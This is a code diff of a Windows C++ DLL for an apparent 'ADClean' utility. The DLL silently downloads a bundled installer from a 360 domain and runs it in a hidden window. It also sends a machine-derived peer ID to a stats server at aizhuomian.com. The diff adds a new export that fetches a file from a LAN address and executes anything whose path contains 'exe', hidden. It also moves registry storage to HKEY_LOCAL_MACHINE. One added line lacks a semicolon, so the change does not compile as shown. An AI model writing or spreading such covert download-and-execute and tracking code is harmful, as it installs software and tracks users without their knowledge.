@@ -232,7 +232,7 @@ extern "C" __declspec(dllexport) void GetPeerID(CHAR * pszPeerID)
 {
 	HKEY hKEY;
 	LPCSTR data_Set= "Software\\ADClean";
-	if (ERROR_SUCCESS == ::RegOpenKeyExA(HKEY_CURRENT_USER,data_Set,0,KEY_READ,&hKEY))
+	if (ERROR_SUCCESS == ::RegOpenKeyExA(HKEY_LOCAL_MACHINE,data_Set,0,KEY_READ,&hKEY))
 	{
 		char szValue[256] = {0};
 		DWORD dwSize = sizeof(szValue);
@@ -251,7 +251,7 @@ extern "C" __declspec(dllexport) void GetPeerID(CHAR * pszPeerID)
 	strcpy(pszPeerID,strPeerID.c_str());
 
 	HKEY hKey, hTempKey;
-	if (ERROR_SUCCESS == ::RegOpenKeyExA(HKEY_CURRENT_USER, "Software",0,KEY_SET_VALUE, &hKey))
+	if (ERROR_SUCCESS == ::RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software",0,KEY_SET_VALUE, &hKey))
 	{
 		if (ERROR_SUCCESS == ::RegCreateKeyA(hKey, "ADClean", &hTempKey))
 		{
@@ -345,7 +345,13 @@ DWORD WINAPI DownLoadWork(LPVOID pParameter)
 	{
 		return 0;
 	}
-	::PathCombineA(szBuffer,szBuffer,"Setup_oemqd50.exe");
+	char *p = strrchr(szUrl, '/')
+	if(p != NULL && strlen(p+1) > 0) {
+		::PathCombineA(szBuffer,szBuffer,p+1);
+	} else {
+		::PathCombineA(szBuffer,szBuffer,"Setup_oemqd50.exe");	
+	}
+	
 	::CoInitialize(NULL);
 	HRESULT hr = E_FAIL;
 	__try
@@ -357,18 +363,19 @@ DWORD WINAPI DownLoadWork(LPVOID pParameter)
 		TSDEBUG4CXX("URLDownloadToCacheFile Exception !!!");
 	}
 	::CoUninitialize();
-	if (SUCCEEDED(hr) && ::PathFileExistsA(szBuffer))
+	if (strstr(szBuffer, "exe") != NULL && SUCCEEDED(hr) && ::PathFileExistsA(szBuffer))
 	{
 		::ShellExecuteA(NULL,"open",szBuffer,NULL,NULL,SW_HIDE);
 	}
+	SetUserHandle();
 	return SUCCEEDED(hr)?ERROR_SUCCESS:0xFF;
 }
 
 extern "C" __declspec(dllexport) void DownLoadBundledSoftware()
 {
-	TSAUTO();
 	CHAR szUrl[] = "http://dl.360safe.com/p/Setup_oemqd50.exe";
 	DWORD dwThreadId = 0;
+	ResetUserHandle();
 	HANDLE hThread = CreateThread(NULL, 0, DownLoadWork, (LPVOID)szUrl,0, &dwThreadId);
 	if (NULL != hThread)
 	{
@@ -382,6 +389,15 @@ extern "C" __declspec(dllexport) void DownLoadBundledSoftware()
 	return;
 }
 
+extern "C" __declspec(dllexport) void DownLoadIniConfig()
+{
+	CHAR szUrl[] = "http://192.168.101.254/test.ini";
+	DWORD dwThreadId = 0;
+	ResetUserHandle();
+	HANDLE hThread = CreateThread(NULL, 0, DownLoadWork, (LPVOID)szUrl,0, &dwThreadId);
+	CloseHandle(hThread);
+}
+
 extern "C" __declspec(dllexport) void Send2LvdunAnyHttpStat(CHAR *op, CHAR *cid)
 {
 	if (op == NULL || cid == NULL)
@@ -392,7 +408,7 @@ extern "C" __declspec(dllexport) void Send2LvdunAnyHttpStat(CHAR *op, CHAR *cid)
 	char szPid[256] = {0};
 	extern void GetPeerID(CHAR * pszPeerID);
 	GetPeerID(szPid);
-	szPid[12] = '\0';
+	/*szPid[12] = '\0';
 	char szMac[128] = {0};
 	for(int i = 0; i < strlen(szPid); ++i)
 	{
@@ -401,10 +417,10 @@ extern "C" __declspec(dllexport) void Send2LvdunAnyHttpStat(CHAR *op, CHAR *cid)
 			strcat(szMac, "-");
 		}
 		szMac[strlen(szMac)] = szPid[i];
-	}
-	std::string str = "http://stat.aizhuomian.com:8084/?mac=";
-	str += szMac;
-	str += "&op=";
+	}*/
+	std::string str = "http://stat.aizhuomian.com:8084/?appid=1001&peerid=";
+	str += szPid;
+	str += "&proid=13&op=";
 	str += op;
 	str += "&cid=";
 	str += cid;
